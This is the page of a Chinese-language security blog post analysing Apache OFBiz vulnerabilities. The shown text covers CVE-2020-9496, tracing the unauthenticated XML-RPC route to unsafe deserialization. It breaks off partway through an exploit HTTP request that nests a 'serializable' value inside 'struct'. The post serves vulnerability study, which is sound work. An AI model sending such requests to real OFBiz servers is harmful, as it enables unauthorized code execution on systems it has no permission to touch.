<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言Apache OFBiz（Open for Business Project）是一个非常强大的开源企业资源规划（ERP）和企业自动化软件。它提供了一整套业务应用程序组件，可以用于构建各种企业级的业务管理系统，包括但不限于客户关系管理（CRM）、供应链管理（SCM）、电子商务、财务管理、制造管理等多个业务领域。 由于其连续爆出多个由于权限问题所导致的漏洞，本文旨在分析部分相关漏洞，学习了解相关的">
<meta property="og:type" content="article">
<meta property="og:title" content="Cursory Analysis Of Apache OFBiz Vulnerability">
<meta property="og:url" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/index.html">
<meta property="og:site_name" content="H3rmesk1t&#39;s Blog">
<meta property="og:description" content="前言Apache OFBiz（Open for Business Project）是一个非常强大的开源企业资源规划（ERP）和企业自动化软件。它提供了一整套业务应用程序组件，可以用于构建各种企业级的业务管理系统，包括但不限于客户关系管理（CRM）、供应链管理（SCM）、电子商务、财务管理、制造管理等多个业务领域。 由于其连续爆出多个由于权限问题所导致的漏洞，本文旨在分析部分相关漏洞，学习了解相关的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343393268-bd8387da-0da6-43b9-b68c-03a711afcb85.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343542744-5cd43174-f94e-43ea-bca0-af34c41f0848.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344116974-6f8165fb-0f26-4dc1-87b4-bde9d21a3432.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344604373-0d66790a-a988-4d9a-aec1-1b5f46afc459.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344657244-cdc5862f-66a6-4018-b492-29e167aae188.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344797184-391c8d08-6c14-4d64-a712-650e19f42d20.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734358989249-dd7b23a0-2bb5-45b6-a7e4-537ec4f897c1.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359084239-f499944f-9769-42cf-b528-cccc49f17272.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359495453-1a557511-5da2-448e-9639-ab80896af324.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359775777-30445024-4d78-4220-8f95-ff577bda34c8.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734420782428-a19209f5-7670-4d37-a2a6-05fcf2f11975.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734361621727-87345e9c-6a2f-4d1d-87f5-379fd6302ac5.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362755803-f50f0527-bf51-4229-938c-afb80219f409.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362215394-a251a14e-e085-4669-af81-1ff3392e0bdd.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362467223-70d20ed6-caae-4a1b-8396-bef28a989fb2.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363080490-be8e8158-3ee6-4eb9-80c9-5daa4b544c02.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363154733-7d9b70ea-2e0d-4db9-9f7a-46827640abf7.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363405198-e9396643-7834-4ea4-9a77-2edb89417858.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423006307-ef7649a9-4ed2-4507-83d7-8268c694fca9.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734423244554-ec57d8c5-7cb8-4885-9119-174aae0b1400.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734401953859-801c2846-16a4-4402-9fe2-2e81822a8aad.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402182734-3a2957cb-b5fd-4f1d-88b1-7828e75a6a5f.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402943170-70799cc4-b629-47de-a925-20eba49c0d56.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734404509876-d372a125-2707-4e7b-b8f2-0fad19ca5cd7.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432201978-9aeb7a72-c23b-4099-9f5d-0c16d4c5e687.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432652162-59c17798-e92d-4393-9fef-b9ed9fab6978.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734433494354-d3abea17-dda4-4429-b267-8444850a57c7.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734434095854-7988ada2-1c70-4db6-8b60-88b141df4623.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734448297486-1d615bc2-3fcc-42bc-a75d-bc5bf9a8862e.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734447710724-f8334bd2-1957-4a34-b1cb-e1e8b4022b35.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449240291-4a5c82cf-e126-40bd-a290-70d84d3e7db7.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449717683-b909bbe3-3800-405c-85ad-fb38a14668ec.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734451330542-839667d9-0376-4ba6-adb7-6522f4a867e9.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437083832-a077cf34-36ae-41cf-894a-0c0cf6ce75e5.png">
<meta property="og:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437403179-da32a43d-0367-4bfb-8e76-6e7845e46ece.png">
<meta property="article:published_time" content="2024-12-17T16:10:00.000Z">
<meta property="article:modified_time" content="2024-12-24T13:00:53.807Z">
<meta property="article:author" content="H3rmesk1t">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="漏洞分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343393268-bd8387da-0da6-43b9-b68c-03a711afcb85.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/my-logo.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/my-logo-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo.png">
        
      
    
    <!-- title -->
    <title>Cursory Analysis Of Apache OFBiz Vulnerability</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="H3rmesk1t&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/24/Cursory-Analysis-Of-Fastjson/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&text=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&is_video=false&description=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cursory Analysis Of Apache OFBiz Vulnerability&body=Check out this article: https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&title=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&name=Cursory Analysis Of Apache OFBiz Vulnerability&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/&t=Cursory Analysis Of Apache OFBiz Vulnerability"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-Auth"><span class="toc-number">2.</span> <span class="toc-text">Pre Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-9496"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2020-9496</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-26295"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2021-26295</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypas-Auth"><span class="toc-number">3.</span> <span class="toc-text">Bypas Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-49070"><span class="toc-number">3.1.</span> <span class="toc-text">CVE-2023-49070</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2023-51467"><span class="toc-number">3.2.</span> <span class="toc-text">CVE-2023-51467</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-38856"><span class="toc-number">3.3.</span> <span class="toc-text">CVE-2024-38856</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-25065"><span class="toc-number">4.1.</span> <span class="toc-text">CVE-2024-25065</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-32113-CVE-2024-36104"><span class="toc-number">4.2.</span> <span class="toc-text">CVE-2024-32113&amp;CVE-2024-36104</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Cursory Analysis Of Apache OFBiz Vulnerability
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">H3rmesk1t</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-17T16:10:00.000Z" class="dt-published" itemprop="datePublished">2024-12-18</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Java/">Java</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">Apache OFBiz（Open for Business Project）是一个非常强大的开源企业资源规划（ERP）和企业自动化软件。它提供了一整套业务应用程序组件，可以用于构建各种企业级的业务管理系统，包括但不限于客户关系管理（CRM）、供应链管理（SCM）、电子商务、财务管理、制造管理等多个业务领域。</font></p>
<p><font style="color:#000000;">由于其连续爆出多个由于权限问题所导致的漏洞，本文旨在分析部分相关漏洞，学习了解相关的漏洞成因及利用手法。Apache OFBiz具体的漏洞细节可以在其官网查看，</font><a target="_blank" rel="noopener" href="https://ofbiz.apache.org/security.html">https://ofbiz.apache.org/security.html</a>。</p>
<h2 id="Pre-Auth"><a href="#Pre-Auth" class="headerlink" title="Pre Auth"></a>Pre Auth</h2><h3 id="CVE-2020-9496"><a href="#CVE-2020-9496" class="headerlink" title="CVE-2020-9496"></a>CVE-2020-9496</h3><p><font style="color:#000000;">Apache XML-RPC是Apache软件基金会下的一个开源项目，它为Java开发者提供了一个完整的XML-RPC实现框架，方便开发人员在Java环境中构建能够支持XML-RPC通信的客户端和服务器端应用程序。但在2010年前后，Apache XML-RPC基本上就不更新了，历史上出现过多个反序列化漏洞（如CVE-2016-5003、CVE-2019-17570），但都没有被修复。</font><strong><font style="color:#000000;">而Apache OFBiz由于使用了XML-RPC组件，因此导致了漏洞的存在。</font></strong></p>
<p><font style="color:#000000;">该漏洞的本质原因为Apache OFBiz使用了XML-RPC组件，从而导致其易受不安全反序列化的影响。漏洞入口点在&#x2F;webtools&#x2F;control&#x2F;xmlrpc，查看framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;web.xml，可以得知control路由由org.apache.ofbiz.webapp.control.ControlServlet进行处理。</font></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/control/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.ControlServlet#doGet方法，先获取RequestHandler。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343393268-bd8387da-0da6-43b9-b68c-03a711afcb85.png"></p>
<p><font style="color:#000000;">接着尝试从ServletContext中获取一个名为_REQUEST_HANDLER_的属性，可以看到读取了framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734343542744-5cd43174-f94e-43ea-bca0-af34c41f0848.png"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;xmlrpc&quot;</span> <span class="attr">track-serverhit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">track-visit</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;xmlrpc&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;none&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">可以看到对于xmlrpc路由，其security的值为false，即无需鉴权即可访问，接着进行一系列请求处理后调用org.apache.ofbiz.webapp.control.RequestHandler#doRequest方法来处理请求。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344116974-6f8165fb-0f26-4dc1-87b4-bde9d21a3432.png"></p>
<p><font style="color:#000000;">接着从framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml文件获取控制器配置信息。然后匹配访问的路由。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344604373-0d66790a-a988-4d9a-aec1-1b5f46afc459.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344657244-cdc5862f-66a6-4018-b492-29e167aae188.png"></p>
<p><font style="color:#000000;">接着调用到org.apache.ofbiz.webapp.control.RequestHandler#runEvent方法，根据event的类型，在工厂类中获取对应的EventHandler并执行其invoke方法。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734344797184-391c8d08-6c14-4d64-a712-650e19f42d20.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734358989249-dd7b23a0-2bb5-45b6-a7e4-537ec4f897c1.png"></p>
<p><font style="color:#000000;">xmlrpc路由对应的EventHandler是XmlRpcEventHandler类，跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke方法，当请求中缺乏echo参数时进入else语句，调用org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359084239-f499944f-9769-42cf-b528-cccc49f17272.png"></p>
<p><font style="color:#000000;">在org.apache.ofbiz.webapp.event.XmlRpcEventHandler#execute方法中，传入获取的XML-RPC配置和创建的HttpStreamConnection对象，执行XML-RPC调用。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359495453-1a557511-5da2-448e-9639-ab80896af324.png"></p>
<p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.event.XmlRpcEventHandler#getRequest方法，创建一个XmlRpcRequestParser对象，用于解析XML-RPC请求，使用SAXParsers#newXMLReader实例化一个新的XMLReader对象，接着利用XMLReader解析输入流中的XML数据。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734359775777-30445024-4d78-4220-8f95-ff577bda34c8.png"></p>
<p><font style="color:#000000;">继续跟进XmlRpcRequestParser，此时对输入流中的XML进行解析，包括startElement方法、endElement方法等，在startElement方法中会调用父类org.apache.xmlrpc.parser.RecursiveTypeParserImpl的startElement方法。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734420782428-a19209f5-7670-4d37-a2a6-05fcf2f11975.png"></p>
<p>在<font style="color:#000000;">org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement方法中，扫描XML的标签的时候会调用getParser方法获取对应标签的parser。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734361621727-87345e9c-6a2f-4d1d-87f5-379fd6302ac5.png"></p>
<p><font style="color:#000000;">当标签为serializable时会调用解析器SerializableParser，其父类是ByteArrayParser，先进行一次Base64解码，然后在SerializerParser#getResult方法中会触发反序列化。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362755803-f50f0527-bf51-4229-938c-afb80219f409.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362215394-a251a14e-e085-4669-af81-1ff3392e0bdd.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734362467223-70d20ed6-caae-4a1b-8396-bef28a989fb2.png"></p>
<p><font style="color:#000000;">需要注意的是，XmlRpcRequestParser的对于XML的解析中，处理过程是按照methodCall，methodName，params，param的顺序遍历标签进行的，当扫描完4个必须提供的标签后，才会调用父类的startElement方法进行处理，而typeParser就是在父类中完成赋值的，随后通过不同的解析器进入不同的解析流程。</font></p>
<p><font style="color:#000000;">因此，最后default中的解析是从value节点内开始的，而直接传入searializable标签是不存在getResult方法触发的，这里利用struct标签进行一层嵌套。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363080490-be8e8158-3ee6-4eb9-80c9-5daa4b544c02.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734363154733-7d9b70ea-2e0d-4db9-9f7a-46827640abf7.png"></p>
<p>漏洞利用数据包如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span 